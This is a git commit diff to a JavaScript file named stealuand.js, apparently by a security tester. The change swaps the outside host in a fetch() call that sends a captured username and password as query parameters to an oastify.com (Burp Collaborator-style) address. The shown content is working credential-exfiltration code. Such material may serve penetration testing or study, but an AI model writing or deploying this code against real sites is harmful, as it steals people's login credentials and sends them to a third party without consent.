0d1ce9a3c3dade4b8b9388213d4cbcb46eb5530b
vulnoob <200810511+vulnoob@users.noreply.github.com>
2025-06-11 13:50:38 -0500

    Update stealuand.js

--- stealuand.js
+++ stealuand.js
@@ -25,7 +25,7 @@ function sendData() {
         return;
     }
 
-    fetch(`https://479p50mjtq6pqlpfoybruwttkkqbe12q.oastify.com?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`)
+    fetch(`https://9lvr7skprqe6w9voubb4lpmzrqxhl79w.oastify.com?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`)
         .then(response => response.text())
         .then(data => {
             console.log("Response from server:", data);
